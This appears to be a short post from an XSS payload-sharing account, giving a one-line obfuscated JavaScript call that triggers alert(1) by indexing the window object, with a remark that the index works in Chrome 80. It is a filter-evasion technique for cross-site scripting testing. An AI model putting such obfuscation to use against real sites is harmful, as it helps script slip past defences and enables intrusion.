##User: XssPayloads	Time: 20200408
> 
 alert(1) obfuscation by @aemkei 
Object.values(this)[145].call(this, +!0);

Note from the author: This works in Chrome 80 but the index (145) of "alert" in windows might be different in other versions or browsers.
